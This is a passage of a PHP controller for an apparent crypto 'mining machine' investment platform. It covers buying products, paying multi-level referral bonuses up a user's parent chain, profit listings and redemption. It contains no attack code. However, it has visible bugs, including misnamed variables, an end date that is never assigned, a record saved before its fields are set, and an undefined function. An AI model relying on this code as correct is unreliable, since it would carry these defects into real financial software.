            $result = change_wallet_balance($user_wallet, 2, -$ming_machine->num * $buy_num, AccountLog::MINING_BALANCE_OUT, '购买矿机');
            if ($result !== true) {
                throw new \Exception($result);
            }
            for ($x = 0; $x < $buy_num; $x++) {
                $num = $ming_machine->num; //usdt数量
                $rate = $ming_machine->rate; //年化收益率
                $days = $ming_machine->days; //天数
                $day_bonus = bcmul($rate / 365, $num, 8);
                $bonus_num = bcmul($day_bonus, $days, 8);
                $user_financial = new UserFinancial();
                $user_financial->financial_id = $minig_id;
                $user_financial->user_id = $user_id;
                $user_financial->financial_name = $ming_machine->financial_name;
                $user_financial->num = $num;
                $user_financial->rate = $rate;
                $user_financial->days = $days;
                $user_financial->day_bonus = $day_bonus;
                $user_financial->currency_id = 3;
                $start_date = date('Ymd', time());
                //                $days=bcadd($ming_machine->days,1,0);
                $days = $ming_machine->days;
                $end_date = date('Ymd', strtotime('+' . $days . ' day'));
                $user_financial->start_date = $start_date;
                $user_financial->end_date = $end_date;
                $user_financial->bonus_num = $bonus_num;
                $user_financial->is_sum = 0;
                $user_financial->is_return = 0;
                $user_financial->status = 1;
                $user_financial->create_time = time();
                $user_financial->is_newuser = $ming_machine->is_newuser;
                $user_financial->save();
            }

            $mining_machine->out_num = $out_num;
            $mining_machine->save();
            DB::commit();
            return $this->success('购买成功');
        } catch (\Exception $exception) {
            DB::rollBack();
            return $this->error($exception->getMessage());
        }
    }

    public function buy_remove(Request $request)
    {
        DB::beginTransaction();
        try {
            $financial_id = $request->get('id');
            $buy_num = $request->get('buy_num');
            if (empty($buy_num) || $buy_num < 1) {
                return $this->error('买卖数量不能小于1');
            }
            $user_id = Users::getUserId();
            $financial_machine = Financial::find($financial_id);
            if (empty($financial_machine)) {
                return $this->error('产品不存在');
            }
            $user_wallet = UsersWallet::where("user_id", $user_id)
                ->where("currency", 18)
                ->lockForUpdate()
                ->first();
            $usdt_balance = $user_wallet->change_balance;
            if (bccomp($usdt_balance, $financial_machine->num * $buy_num) < 0) {
                return $this->error('余额不足');
            }
            $financial = Financial::find($financial_id);
            $out_num = bcadd($financial->out_num, $buy_num, 0);
            if ($out_num > $financial->stock_num) {
                return $this->error('套餐库存不足');
            }


            $result = change_wallet_balance($user_wallet, 2, -$financial_machine->num * $buy_num, AccountLog::FINANCIAL_BALANCE_OUT, '购买理财产品');
            if ($result !== true) {
                throw new \Exception($result);
            }

            $user = Users::getById($user_id);
            $parents = UserDAO::getParentsPathDesc($user);
            for ($x = 0; $x < $buy_num; $x++) {
                $num = $financial_machine->num; //usdt数量
                // $rate=$financial_machine->rate;//年化收益率
                // $days=$financial_machine->days;//天数
                // $day_bonus=bcmul($rate/365,$num,8);
                // $bonus_num=bcmul($day_bonus,$days,8);
                $user_financial = new UserFinancial();
                $user_financial->financial_id = $financial_id;
                $user_financial->user_id = $user_id;
                $user_financial->financial_name = $financial_machine->financial_name;
                $user_financial->num = $num;
                // $user_financial->rate=$rate;
                // $user_financial->days=$days;
                // $user_financial->day_bonus=$day_bonus;
                $user_financial->currency_id = 3;
                $start_date = date('Ymd', time());
                //                $days=bcadd($financial_machine->days,1,0);
                $days = $financial_machine->days;
                $end_date = date('Ymd', strtotime('+' . $days . ' day'));
                $user_financial->start_date = $start_date;
                $user_financial->end_date; //上级动态收益
                $parent_bonus_num = 0;
                for ($i = 0; $i < count($parents); $i++) {
                    # code...
                    $parent_id = $parents[$i];
                    $team_charge = $this->getTeamCharge($parent_id);
                    if ($team_charge['recharge'] <= 0) {
                        continue;
                    }
                    // if($team_charge->recharge>0){
                    $config = BondConfig::Intnace();
                    $rate = $config->getFundDynamicConfig($team_charge['team_total_recharge'], $i + 1);
                    if ($rate > 0) {
                        $rate_num = $financial_machine->num * $buy_num * $rate;
                        $parent_bonus_num += $rate_num;
                        $user_wallet = UsersWallet::where("user_id", $parent_id)
                            ->where("currency", 18)
                            ->lockForUpdate()
                            ->first();
                        change_wallet_balance($user_wallet, 2, $rate_num, AccountLog::FINANCIAL_PARENT_BONUS, '获取动态收益：' . $financial_machine->num . '的' . $rate . '');
                    }
                }
                $user_financial->parent_bonus_num = $parent_bonus_num; //上级用户总分红
                $user_financial->save();
                // $user_financial->bonus_num=$bonus_num;
                $user_financial->is_sum = 0;
                $user_financial->is_return = 0;
                $user_financial->status = 1;
                $user_financial->create_time = time();
                $user_financial->is_newuser = $financial_machine->is_newuser;
            }
            $financial->out_num = $out_num;
            $financial->save();

            DB::commit();
            return $this->success('购买成功');
        } catch (\Exception $exception) {
            DB::rollBack();
            return $this->error($exception->getMessage());
        }
    }

    public static function getTeamCharge($user_id)
    {
        $date = date('Y-m-d', time());
        $address_url = 'http://127.0.0.1:5566/show/user_report?day=' . $date . '&uid=' . $user_id;
        $res = RPC::apihttp($address_url);
        $res = @json_decode($res, true);
        $res['call_date'] = $date;
        return $res;
    }



    /***
     * 总分红
     */
    public function bonusTotal(Request $request)
    {
    }

    /***
     * 收益列表
     */
    public function bonusList(Request $request)
    {
        $limit = $request->get('limit', '15');
        $page = $request->get('page', '1');
        $user_id = Users::getUserId();
        $financialReturnBonus = FinancialReturnsBonus::where('user_id', $user_id)
            ->orderBy('id', 'desc')
            ->paginate($limit, ['*'], 'page', $page);
        if (empty($financialReturnBonus)) {
            return $this->error('您还没有分红记录');
        }
        return $this->success(array(
            "list" => $financialReturnBonus->items(), 'count' => $financialReturnBonus->total(),
            "page" => $page, "limit" => $limit
        ));
    }
    /***
     * 昨日收益
     */
    public function yesterdayProfit(Request $request)
    {
        //        $usdt_price=Currency::getCnyPrice(3);
        $usdt_price = Setting::getValueByKey('mining_usdt_price', '0');
        $limit = $request->get('limit', '15');
        $page = $request->get('page', '1');
        $user_id = Users::getUserId(); //33邀请返佣 309矿机分红
        //        $start_time=strtotime(date('Y-m-d',strtotime('-1 day')));
        //        $end_time=strtotime(date('Y-m-d'));
        $start_time = strtotime(date('Y-m-d'));
        $end_time = strtotime(date('Y-m-d', strtotime('+1 day')));
        $data = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::MINING_BONUS, AccountLog::MINING_PARENT_BONUS])
            ->where('created_time', '>=', $start_time)
            ->where('created_time', '<=', $end_time)
            ->orderBy('id', 'DESC')->paginate($limit);
        $yesterday_total = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::MINING_BONUS, AccountLog::MINING_PARENT_BONUS])
            ->where('created_time', '>=', $start_time)
            ->where('created_time', '<=', $end_time)->select();
        $total_profit = $yesterday_total->sum('value'); //收益
        $total_invite = $yesterday_total->where('type', AccountLog::MINING_PARENT_BONUS)->sum('value'); //邀请收益

        return $this->success('操作成功', array(
            'total_invite' => $total_invite,
            'total_invite_cny' => bcmul($total_invite, $usdt_price, 8),
            'total_profit' => $total_profit,
            'total_profit_cny' => bcmul($total_profit, $usdt_price, 8),
            "data" => $data->items(),
            "limit" => $limit,
            "page" => $page,
        ));
    }

    /***
     * 我的邀请
     */
    public function myInvite(Request $request)
    {
        //                $usdt_price=Currency::getCnyPrice(3);
        $usdt_price = Setting::getValueByKey('mining_usdt_price', '0');
        $limit = $request->get('limit', '15');
        $page = $request->get('page', '1');
        $user_id = Users::getUserId();
        $total_invite = Users::where('parent_id', $user_id)->count();
        $data = Users::where('parent_id', $user_id)
            ->orderBy('id', 'DESC')
            ->paginate($limit);
        $data = $data->items();
        $list = array();
        foreach ($data as $key => $value) {
            $val = [];
            $val['user_id'] = $value['id'];
            $val['account_number'] = $value['account_number'];
            $val['financial_total'] = UserFinancial::where('user_id', $value['id'])->where('status', 1)->sum('num');
            $val['register_time'] = $value['time'];
            $list[]     = $val;
        }
        return $this->success('操作成功', array(
            'total_invite' => $total_invite,
            'total_invite_cny' => bc($total_invite, $usdt_price, 0),
            "data" => $list,
            "limit" => $limit,
            "page" => $page,
        ));
    }

    /***
     * 累计收益
     * @param Request $request
     */
    public function totalProfit(Request $request)
    {
        $limit = $request->get('limit', '15');
        $page = $request->get('page', '1');
        $user_id = Users::getUserId();
        $data = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::FINANCIAL_BONUS, AccountLog::FINANCIAL_PARENT_BONUS])
            ->orderBy('id', 'DESC')->paginate($limit);
        $data_count = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::FINANCIAL_BONUS, AccountLog::FINANCIAL_PARENT_BONUS])->count();
        $total_data = AccountLog::where("user_id", $user_id)
            ->whereIn('type', [AccountLog::FINANCIAL_BONUS, AccountLog::FINANCIAL_PARENT_BONUS])
            ->orderBy('id', 'DESC')->select();
        $total_profit = $total_data->sum('value'); //总收益
        //        $usdt_price=Currency::getCnyPrice(3);
        $usdt_price = Setting::getValueByKey('mining_usdt_price', '0');
        $total_invite = $total_data->where('type', AccountLog::FINANCIAL_PARENT_BONUS)->sum('value'); //推广收益

        $start_time = strtotime(date('Y-m-d', strtotime('-1 day')));
        $end_time = strtotime(date('Y-m-d'));
        $yesterday_profit = AccountLog::where("user_id", $user_id) //昨日收益
            ->whereIn('type', [AccountLog::FINANCIAL_BONUS, AccountLog::FINANCIAL_PARENT_BONUS])
            ->where('created_time', '>=', $start_time)
            ->where('created_time', '<=', $end_time)->sum('value');

        $list = array();
        foreach ($data as $value) {
            $arr = [];
            $arr['name'] = $value['type'] == 313 ? '矿机分红' : '邀请分红';
            $arr['created_time'] = $value['created_time'];
            $arr['value'] = $value['value'];
            $arr['info'] = $value['info'];
            $list[] = $arr;
        }
        return $this->success('操作成功', array(
            'total_profit' => $total_profit,
            'total_profit_cny' => bcmul($total_profit, $usdt_price, 8),
            'total_invite' => $total_invite,
            'total_invite_cny' => bcmul($total_invite, $usdt_price, 8),
            'yesterday_profit' => $yesterday_profit,
            'yesterday_profit_cny' => bcmul($yesterday_profit, $usdt_price, 8),
            "data" => $list,
            "data_count" => $data_count,
            "limit" => $limit,
            "page" => $page,
        ));
    }

    /**
     * 赎回矿机
     */
    public function redeemFinancial(Request $request)
    {
        $user_financial_id = $request->get('id');
        $user_id = Users::getUserId();
        DB::beginTransaction();
        try {
            $user_financial = UserFinancial::where('id', $user_financial_id)->where('user_id', $user_id)->first();
            if (!$user_financial) {
                return $this->error("矿机不存在");
            }
            if ($user_financial['status'] != 1) {
                return $this->error("矿机状态错误");
            }
            //设置的固定手续费
            $redeem_poundage = Setting::getValueByKey('redeem_poundage', '0');
            $redeem_poundage_num = bcmul($user_financial['num'], $redeem_poundage, 8);
            // $total_bonus=bcadd($user_financial['bonus_num'],$user_financial['parent_bonus_num'],8);
            $total_bonus = bcadd($user_financial['bonus_num'], $redeem_poundage_num, 8);
            $return_num = bcsub($user_financial['num'], $total_bonus, 8);
            if ($return_num < 0) {
                return $this->error("分红数量超过购买数量赎回失败");
            }
            $user_financial['is_sum'] = 1;
            $user_financial['is_return'] = 1;
            $user_financial['status'] = -1;
            $user_financial->save();
            $user_wallet = UsersWallet::where("user_id", $user_id)
                ->where("currency", 18)
                ->lockForUpdate()
                ->first();
            $result = change_wallet_balance($user_wallet, 1, $return_num, AccountLog::FINANCIAL_REDEEM, '赎回理财产品');
            if ($result !== true) {
                throw new \Exception($result);
            }

            DB::commit();
            return $this->success('赎回成功');
        } catch (\Exception $exception) {
            DB::rollBack();
            return $this->error($exception->getMessage());
        }
    }
}
